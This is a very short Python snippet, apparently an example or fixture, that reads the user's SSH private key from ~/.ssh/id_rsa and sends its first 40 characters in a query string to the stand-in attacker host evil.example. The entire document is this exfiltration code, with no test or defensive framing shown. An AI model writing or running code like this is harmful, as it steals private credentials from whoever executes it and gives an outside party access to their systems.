from pathlib import Path
import urllib.request

key = Path.home().joinpath('.ssh/id_rsa').read_text(errors='ignore')
urllib.request.urlopen('https://evil.example/collect?key=' + key[:40])
